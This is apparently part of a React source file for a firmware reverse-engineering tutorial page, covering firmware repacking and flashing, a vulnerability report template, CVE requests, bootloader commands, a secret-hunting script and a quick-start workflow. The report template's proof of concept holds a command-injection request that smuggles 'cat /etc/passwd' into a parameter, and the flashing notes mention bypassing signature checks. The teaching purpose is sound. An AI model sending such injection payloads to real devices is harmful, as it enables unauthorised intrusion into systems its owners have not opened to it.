# 1. Note offsets from original binwalk output
# 2. Concatenate parts:

$ dd if=original.bin of=header.bin bs=1 count=1835008
$ cat header.bin new_filesystem.squashfs > new_firmware.bin

# Padding to original size (if needed):
$ truncate -s $(stat -c%s original.bin) new_firmware.bin

# Firmware-mod-kit (automated):
$ git clone https://github.com/rampageX/firmware-mod-kit
$ ./extract-firmware.sh firmware.bin
# Modify files in fmk/rootfs/
$ ./build-firmware.sh
# Output in fmk/new-firmware.bin

# Fixing checksums (many firmware have header checksums):
# - TRX headers: Use firmware-mod-kit or trx tool
# - Vendor-specific: May need to reverse engineer checksum algorithm`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#84cc16" }}>
            Flashing Modified Firmware
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { method: "Web Interface", risk: "Low", desc: "Use device's firmware update page", notes: "May check signatures, easiest if it works" },
              { method: "TFTP Recovery", risk: "Low", desc: "Boot to recovery mode, serve via TFTP", notes: "Often bypasses signature checks" },
              { method: "U-Boot Flash", risk: "Medium", desc: "Write directly from bootloader", notes: "Full control, need serial access" },
              { method: "SPI Programmer", risk: "Medium", desc: "Write directly to flash chip", notes: "Bypasses all checks, need hardware" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#84cc16", 0.03), border: `1px solid ${alpha("#84cc16", 0.1)}` }}>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 0.5 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#84cc16" }}>{item.method}</Typography>
                    <Chip label={item.risk + " Risk"} size="small" sx={{ bgcolor: alpha(item.risk === "Low" ? "#22c55e" : "#f59e0b", 0.15), color: item.risk === "Low" ? "#22c55e" : "#f59e0b", fontWeight: 600, fontSize: "0.65rem" }} />
                  </Box>
                  <Typography variant="body2" sx={{ fontSize: "0.85rem", mb: 0.5 }}>{item.desc}</Typography>
                  <Typography variant="caption" color="text.secondary">{item.notes}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Backup Before Flashing!</AlertTitle>
            <Typography variant="body2">
              Always dump the original firmware before flashing modifications. If something goes wrong, you'll need 
              the original to recover. Use UART/JTAG/SPI to dump even if you can't boot—a bricked device with a 
              backup is recoverable, one without isn't.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 14: REPORTING & DISCLOSURE ==================== */}
        <Paper
          id="reporting-disclosure-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#22c55e", 0.02),
            border: `1px solid ${alpha("#22c55e", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#22c55e", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#22c55e",
              }}
            >
              <DescriptionIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#22c55e" }}>
                14. Reporting & Responsible Disclosure
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Finding vulnerabilities is only part of the job—responsibly reporting them is equally important. 
            Good disclosure practices protect users, build your reputation, and can even lead to bug bounties. 
            This section covers how to document findings, communicate with vendors, and navigate the CVE process.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            Writing a Vulnerability Report
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Vulnerability Report Template
# =============================

## Summary
- Product: [Vendor] [Model] [Version]
- Vulnerability Type: [e.g., Command Injection]
- Severity: [Critical/High/Medium/Low] - CVSS: [score]
- Discovery Date: [Date]
- Researcher: [Your name/handle]

## Affected Versions
- Firmware version X.X.X (confirmed)
- Likely affects versions X.X.X - Y.Y.Y

## Description
Clear explanation of the vulnerability, its root cause,
and why it's a security issue.

## Technical Details
- Vulnerable component: [file/function/endpoint]
- Attack vector: [network/local/physical]
- Authentication required: [yes/no]

## Proof of Concept
Step-by-step reproduction:
1. [Setup steps]
2. [Exploitation steps]
3. [Expected result showing impact]

# Example request/command:
curl -X POST 'http://device/cgi-bin/vuln.cgi' \\
  -d 'param=; cat /etc/passwd'

## Impact
What an attacker could achieve (RCE, data theft, DoS, etc.)

## Remediation
Suggested fix (input validation, removing functionality, etc.)

## Timeline
- [Date]: Vulnerability discovered
- [Date]: Vendor contacted
- [Date]: Vendor response
- [Date]: Patch released
- [Date]: Public disclosure`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            Disclosure Timeline
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { phase: "1. Discovery", time: "Day 0", action: "Document everything, create PoC, verify impact" },
              { phase: "2. Initial Contact", time: "Day 1-7", action: "Find security contact, send encrypted report" },
              { phase: "3. Acknowledgment", time: "Day 7-14", action: "Vendor confirms receipt, discusses timeline" },
              { phase: "4. Coordination", time: "Day 14-60", action: "Work with vendor on fix, test patches" },
              { phase: "5. Patch Release", time: "Day 60-90", action: "Vendor releases fix, users update" },
              { phase: "6. Public Disclosure", time: "Day 90+", action: "Publish advisory, request CVE if not assigned" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#22c55e", 0.03), border: `1px solid ${alpha("#22c55e", 0.1)}` }}>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 0.5 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e" }}>{item.phase}</Typography>
                    <Chip label={item.time} size="small" sx={{ bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600, fontSize: "0.65rem" }} />
                  </Box>
                  <Typography variant="body2" sx={{ fontSize: "0.85rem" }}>{item.action}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            Getting a CVE Assigned
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# CVE (Common Vulnerabilities and Exposures) Process
# ==================================================

What is a CVE?
- Unique identifier for a vulnerability (CVE-YYYY-NNNNN)
- Industry standard for tracking security issues
- Required for many bug bounty payouts

Who can assign CVEs?
- MITRE (primary CNA - CVE Numbering Authority)
- Vendor CNAs (Microsoft, Google, Cisco, etc.)
- Third-party CNAs (GitHub, HackerOne, etc.)

How to request a CVE:

1. Check if vendor is a CNA:
   https://cve.mitre.org/cve/request_id.html#cna_participants
   If yes, ask vendor to assign CVE

2. If vendor is not a CNA or unresponsive:
   Submit to MITRE: https://cveform.mitre.org/
   Include:
   - Product name and vendor
   - Affected versions
   - Vulnerability type
   - Impact description
   - Your contact info

3. Wait for assignment (usually 1-7 days)

4. Once assigned, you can reference it in:
   - Public advisories
   - Security blogs
   - Conference talks
   - Your resume/portfolio!`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            Where to Publish Research
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { platform: "Full Disclosure", desc: "Mailing list for public vulnerability announcements", url: "seclists.org/fulldisclosure" },
              { platform: "Exploit-DB", desc: "Archive of exploits and vulnerable software", url: "exploit-db.com" },
              { platform: "PacketStorm", desc: "Security news, files, tools, exploits", url: "packetstormsecurity.com" },
              { platform: "Personal Blog", desc: "Detailed writeups with full technical depth", url: "Your own platform" },
              { platform: "Security Conferences", desc: "DEF CON, Black Hat, BSides, local meetups", url: "Great for career!" },
              { platform: "GitHub", desc: "Release tools, PoCs, and documentation", url: "github.com" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#22c55e", 0.03), border: `1px solid ${alpha("#22c55e", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 0.5 }}>{item.platform}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.85rem", mb: 0.5 }}>{item.desc}</Typography>
                  <Typography variant="caption" color="text.secondary">{item.url}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="success" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>The Golden Rule</AlertTitle>
            <Typography variant="body2">
              Give vendors reasonable time to fix issues (90 days is standard), but don't let them delay indefinitely. 
              If a vendor is unresponsive after multiple attempts, you may disclose publicly to protect users. Document 
              all communication attempts. Your goal is to make the world more secure, not to embarrass vendors.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== ESSENTIAL TOOLS QUICK REFERENCE ==================== */}
        <Paper
          id="tools-reference"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#06b6d4", 0.02),
            border: `1px solid ${alpha("#06b6d4", 0.15)}`,
            scrollMarginTop: 96,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <Box sx={{ width: 48, height: 48, borderRadius: 2, background: "linear-gradient(135deg, #06b6d4, #3b82f6)", display: "flex", alignItems: "center", justifyContent: "center" }}>
              <BuildIcon sx={{ color: "white", fontSize: 28 }} />
            </Box>
            Essential Tools Quick Reference
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {essentialTools.map((tool, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha(tool.color, 0.05), border: `1px solid ${alpha(tool.color, 0.15)}` }}>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 1 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: tool.color }}>{tool.name}</Typography>
                    <Chip label={tool.category} size="small" sx={{ bgcolor: alpha(tool.color, 0.15), color: tool.color, fontWeight: 600, fontSize: "0.65rem" }} />
                  </Box>
                  <Typography variant="body2" sx={{ mb: 1.5 }}>{tool.desc}</Typography>
                  <Typography variant="caption" sx={{ fontFamily: "monospace", bgcolor: alpha(tool.color, 0.1), px: 1, py: 0.5, borderRadius: 1 }}>
                    {tool.install}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>Hardware Interface Comparison</Typography>
          <TableContainer component={Paper} sx={{ mb: 3, bgcolor: alpha("#06b6d4", 0.02) }}>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell sx={{ fontWeight: 700 }}>Interface</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Pins</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Voltage</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Speed</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Primary Use</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Difficulty</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {hardwareInterfaces.map((row, idx) => (
                  <TableRow key={idx}>
                    <TableCell sx={{ fontWeight: 600, color: "#06b6d4" }}>{row.iface}</TableCell>
                    <TableCell>{row.pins}</TableCell>
                    <TableCell>{row.voltage}</TableCell>
                    <TableCell>{row.speed}</TableCell>
                    <TableCell>{row.use}</TableCell>
                    <TableCell>
                      <Chip 
                        label={row.difficulty} 
                        size="small" 
                        sx={{ 
                          bgcolor: alpha(row.difficulty === "Easy" ? "#22c55e" : "#f59e0b", 0.15), 
                          color: row.difficulty === "Easy" ? "#22c55e" : "#f59e0b",
                          fontWeight: 600,
                          fontSize: "0.7rem"
                        }} 
                      />
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>Filesystem Types Reference</Typography>
          <TableContainer component={Paper} sx={{ mb: 3, bgcolor: alpha("#06b6d4", 0.02) }}>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell sx={{ fontWeight: 700 }}>Filesystem</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Compression</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Type</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Common Use</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Extract Tool</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {filesystemTypes.map((row, idx) => (
                  <TableRow key={idx}>
                    <TableCell sx={{ fontWeight: 600, color: "#3b82f6" }}>{row.fs}</TableCell>
                    <TableCell>{row.compression}</TableCell>
                    <TableCell>{row.readOnly ? "Read-only" : "Read-write"}</TableCell>
                    <TableCell>{row.use}</TableCell>
                    <TableCell sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>{row.extract}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
        </Paper>

        {/* ==================== U-BOOT COMMANDS REFERENCE ==================== */}
        <Paper
          id="bootloader-reference"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#8b5cf6", 0.02),
            border: `1px solid ${alpha("#8b5cf6", 0.15)}`,
            scrollMarginTop: 96,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <Box sx={{ width: 48, height: 48, borderRadius: 2, background: "linear-gradient(135deg, #8b5cf6, #a855f7)", display: "flex", alignItems: "center", justifyContent: "center" }}>
              <AccountTreeIcon sx={{ color: "white", fontSize: 28 }} />
            </Box>
            Bootloader Commands Reference
          </Typography>

          <Accordion sx={{ mb: 2, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2, "&:before": { display: "none" } }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#8b5cf6" }}>U-Boot Commands (Most Common)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ fontWeight: 700 }}>Command</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Description</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Example</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {bootloaderCommands.uboot.map((cmd, idx) => (
                      <TableRow key={idx}>
                        <TableCell sx={{ fontFamily: "monospace", color: "#8b5cf6", fontWeight: 600 }}>{cmd.cmd}</TableCell>
                        <TableCell>{cmd.desc}</TableCell>
                        <TableCell sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>{cmd.example}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </AccordionDetails>
          </Accordion>

          <Accordion sx={{ mb: 2, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2, "&:before": { display: "none" } }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#8b5cf6" }}>CFE Commands (Broadcom Devices)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ fontWeight: 700 }}>Command</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Description</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Example</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {bootloaderCommands.cfe.map((cmd, idx) => (
                      <TableRow key={idx}>
                        <TableCell sx={{ fontFamily: "monospace", color: "#8b5cf6", fontWeight: 600 }}>{cmd.cmd}</TableCell>
                        <TableCell>{cmd.desc}</TableCell>
                        <TableCell sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>{cmd.example}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </AccordionDetails>
          </Accordion>

          <CodeBlock
            title="U-Boot Firmware Dump via TFTP"
            language="bash"
            code={`# Connect UART (115200 8N1), power on, press any key to interrupt boot

# Configure network
U-Boot> setenv ipaddr 192.168.1.1
U-Boot> setenv serverip 192.168.1.100

# Read flash to RAM (adjust addresses for your device)
U-Boot> sf probe 0
U-Boot> sf read 0x80000000 0x0 0x1000000  # Read 16MB to RAM

# Transfer to TFTP server
U-Boot> tftpput 0x80000000 0x1000000 dump.bin

# On your computer (Linux):
$ sudo apt install tftpd-hpa
$ sudo mkdir -p /srv/tftp && sudo chmod 777 /srv/tftp
$ sudo systemctl start tftpd-hpa
# File appears at /srv/tftp/dump.bin`}
          />
        </Paper>

        {/* ==================== VULNERABILITY HUNTING CHECKLIST ==================== */}
        <Paper
          id="vuln-checklist"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#ef4444", 0.02),
            border: `1px solid ${alpha("#ef4444", 0.15)}`,
            scrollMarginTop: 96,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <Box sx={{ width: 48, height: 48, borderRadius: 2, background: "linear-gradient(135deg, #ef4444, #dc2626)", display: "flex", alignItems: "center", justifyContent: "center" }}>
              <BugReportIcon sx={{ color: "white", fontSize: 28 }} />
            </Box>
            Vulnerability Hunting Checklist
          </Typography>

          <Grid container spacing={3}>
            {vulnHuntingChecklist.map((category, idx) => (
              <Grid item xs={12} md={6} key={idx}>
                <Paper sx={{ p: 3, height: "100%", borderRadius: 2, bgcolor: alpha(category.severity === "Critical" ? "#ef4444" : category.severity === "High" ? "#f97316" : "#f59e0b", 0.03), border: `1px solid ${alpha(category.severity === "Critical" ? "#ef4444" : category.severity === "High" ? "#f97316" : "#f59e0b", 0.15)}` }}>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 2 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: category.severity === "Critical" ? "#ef4444" : category.severity === "High" ? "#f97316" : "#f59e0b" }}>
                      {category.category}
                    </Typography>
                    <Chip 
                      label={category.severity} 
                      size="small" 
                      sx={{ 
                        bgcolor: alpha(category.severity === "Critical" ? "#ef4444" : category.severity === "High" ? "#f97316" : "#f59e0b", 0.15),
                        color: category.severity === "Critical" ? "#ef4444" : category.severity === "High" ? "#f97316" : "#f59e0b",
                        fontWeight: 600,
                        fontSize: "0.7rem"
                      }} 
                    />
                  </Box>
                  <List dense sx={{ py: 0 }}>
                    {category.checks.map((check, checkIdx) => (
                      <ListItem key={checkIdx} sx={{ py: 0.25, px: 0 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}>
                          <RadioButtonUncheckedIcon sx={{ fontSize: 14, color: "text.secondary" }} />
                        </ListItemIcon>
                        <ListItemText primary={<Typography variant="body2" sx={{ fontSize: "0.85rem" }}>{check}</Typography>} />
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <CodeBlock
            title="Automated Vulnerability Hunting Script"
            language="bash"
            code={`#!/bin/bash
# firmware_vuln_hunt.sh - Quick vulnerability scan on extracted firmware

ROOTFS=$1
if [ -z "$ROOTFS" ]; then
    echo "Usage: $0 <extracted_rootfs_path>"
    exit 1
fi

echo "=== FIRMWARE VULNERABILITY HUNTER ==="
echo "[*] Target: $ROOTFS"
echo ""

echo "[1/7] Checking for hardcoded credentials..."
grep -rn "password\|passwd\|secret\|admin" "$ROOTFS/etc/" 2>/dev/null | head -20

echo ""
echo "[2/7] Searching for private keys..."
find "$ROOTFS" -name "*.pem" -o -name "*.key" -o -name "*.der" 2>/dev/null

echo ""
echo "[3/7] Looking for command injection sinks..."
grep -rn "system(\|popen(\|exec(\|passthru(" "$ROOTFS" --include="*.c" --include="*.php" --include="*.lua" 2>/dev/null | head -20

echo ""
echo "[4/7] Checking /etc/passwd and /etc/shadow..."
cat "$ROOTFS/etc/passwd" 2>/dev/null
cat "$ROOTFS/etc/shadow" 2>/dev/null

echo ""
echo "[5/7] Looking for hardcoded IPs and URLs..."
grep -rnoE "([0-9]{1,3}\\.){3}[0-9]{1,3}" "$ROOTFS/etc/" 2>/dev/null | head -20
strings $(find "$ROOTFS" -type f -executable) 2>/dev/null | grep -E "^https?://" | sort -u | head -20

echo ""
echo "[6/7] Checking for debug/backdoor strings..."
strings $(find "$ROOTFS" -type f -executable) 2>/dev/null | grep -iE "debug|backdoor|telnet|enable" | head -20

echo ""
echo "[7/7] Listing SUID binaries..."
find "$ROOTFS" -perm -4000 -type f 2>/dev/null

echo ""
echo "=== SCAN COMPLETE ==="`}
          />
        </Paper>

        {/* ==================== QUICK START WORKFLOW ==================== */}
        <Paper
          id="quick-start"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            background: `linear-gradient(135deg, ${alpha("#10b981", 0.05)} 0%, ${alpha("#06b6d4", 0.05)} 100%)`,
            border: `1px solid ${alpha("#10b981", 0.15)}`,
            scrollMarginTop: 96,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <Box sx={{ width: 48, height: 48, borderRadius: 2, background: "linear-gradient(135deg, #10b981, #06b6d4)", display: "flex", alignItems: "center", justifyContent: "center" }}>
              <SpeedIcon sx={{ color: "white", fontSize: 28 }} />
            </Box>
            Quick Start: Your First Firmware Analysis
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Follow this step-by-step guide to analyze your first firmware image. We'll use a router firmware as an example, 
            but the same process applies to most Linux-based embedded devices.
          </Typography>

          <Box sx={{ mb: 4 }}>
            {[
              { step: 1, title: "Get the Firmware", desc: "Download from vendor website or extract from device", time: "5 min", cmd: "wget https://support.netgear.com/firmware/R7000.zip && unzip R7000.zip" },
              { step: 2, title: "Initial Analysis", desc: "Identify file type and embedded content", time: "2 min", cmd: "file firmware.bin && binwalk firmware.bin" },
              { step: 3, title: "Extract Filesystem", desc: "Unpack all embedded files and filesystems", time: "5 min", cmd: "binwalk -eM firmware.bin && cd _firmware.bin.extracted" },
              { step: 4, title: "Explore Structure", desc: "Navigate and understand the filesystem layout", time: "10 min", cmd: "ls -la squashfs-root/ && cat squashfs-root/etc/passwd" },
              { step: 5, title: "Hunt for Secrets", desc: "Search for passwords, keys, and sensitive data", time: "15 min", cmd: "grep -rn 'password' squashfs-root/etc/" },
              { step: 6, title: "Analyze Binaries", desc: "Examine key executables in Ghidra", time: "30+ min", cmd: "ghidraRun  # Load squashfs-root/bin/httpd" },
            ].map((item, idx) => (
              <Paper 
                key={idx}
                sx={{ 
                  p: 3, 
                  mb: 2, 
                  borderRadius: 2, 
                  bgcolor: "background.paper",
                  border: `1px solid ${alpha("#10b981", 0.1)}`,
                  borderLeft: `4px solid #10b981`,
                }}
              >
                <Box sx={{ display: "flex", alignItems: "flex-start", gap: 3 }}>
                  <Box sx={{ display: "flex", flexDirection: "column", alignItems: "center" }}>
                    <Box sx={{ width: 40, height: 40, borderRadius: "50%", bgcolor: "#10b981", color: "white", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: 700 }}>
                      {item.step}
                    </Box>
                    <Typography variant="caption" color="text.secondary" sx={{ mt: 0.5 }}>{item.time}</Typography>
                  </Box>
                  <Box sx={{ flex: 1 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 0.5 }}>{item.title}</Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ mb: 1.5 }}>{item.desc}</Typography>
                    <Box sx={{ bgcolor: "#0d1117", p: 1.5, borderRadius: 1 }}>
                      <Typography component="pre" sx={{ m: 0, fontFamily: "'Fira Code', monospace", fontSize: "0.8rem", color: "#e6edf3", whiteSpace: "pre-wrap" }}>
                        $ {item.cmd}
                      </Typography>
                    </Box>
                  </Box>
                </Box>
              </Paper>
            ))}
          </Box>

          <Alert severity="success" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>🎉 Congratulations!</AlertTitle>
            <Typography variant="body2">
              You've completed your first firmware analysis! Keep exploring—check the web interface files in <code>/www</code>, 
              look at startup scripts in <code>/etc/init.d</code>, and try emulating binaries with QEMU. Each firmware 
              image is a new puzzle to solve.
            </Typography>
          </Alert>
        </Paper>

        {/* Resources & Next Steps */}
        <Paper
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 4,
            background: `linear-gradient(135deg, ${alpha("#06b6d4", 0.08)} 0%, ${alpha("#8b5cf6", 0.08)} 100%)`,
            border: `1px solid ${alpha("#06b6d4", 0.15)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1.5 }}>
            <TipsAndUpdatesIcon sx={{ color: "#06b6d4" }} />
            Resources & Next Steps
          </Typography>

          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
                📚 Learning Resources
              </Typography>
              <List dense>
                {[
                  "The Firmware Handbook (Ganssle)",
                  "Practical IoT Hacking (Chantzis, et al.)",
                  "Inside Radio: An Attack and Defense Guide",
                  "Embedded Systems Security (Kleidermacher)",
                  "ARM Assembly Basics tutorials",
                  "Azeria Labs ARM exploitation",
                ].map((resource, idx) => (
                  <ListItem key={idx} sx={{ py: 0.5 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#06b6d4" }} />
                    </ListItemIcon>
                    <ListItemText primary={<Typography variant="body2">{resource}</Typography>} />
                  </ListItem>
                ))}
              </List>
            </Grid>
            <Grid item xs={12} md={6}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                🔬 Practice Platforms
              </Typography>
              <List dense>
                {[
                  "Damn Vulnerable Router Firmware (DVRF)",
                  "IoTGoat - OWASP vulnerable IoT project",
                  "Embedded Security CTF challenges",
                  "AttifyOS - IoT pentesting distro",
                  "Old routers from thrift stores/eBay",
                  "Raspberry Pi for ARM practice",
                ].map((platform, idx) => (
                  <ListItem key={idx} sx={{ py: 0.5 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#8b5cf6" }} />
                    </ListItemIcon>
                    <ListItemText primary={<Typography variant="body2">{platform}</Typography>} />
                  </ListItem>
                ))}
              </List>
            </Grid>
          </Grid>

          <Divider sx={{ my: 3 }} />

          <Alert severity="success" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Ready to Start?</AlertTitle>
            <Typography variant="body2">
              Begin your firmware reverse engineering journey by downloading firmware from a device you own 
              (check the manufacturer's support page), install Binwalk and Ghidra, and try extracting and 
              exploring the filesystem. Even without hardware hacking equipment, there's a huge amount you 
              can learn from software analysis alone!
            </Typography>
          </Alert>
        </Paper>

        <QuizSection />

        {/* Bottom Navigation */}
        <Box sx={{ mt: 4, textAlign: "center" }}>
          <Button
            variant="outlined"
            startIcon={<ArrowBackIcon />}
            onClick={() => navigate("/learn")}
            sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
          >
            Back to Learning Hub
          </Button>
        </Box>
        </Box>
      </Box>
    </LearnPageLayout>
  );
}
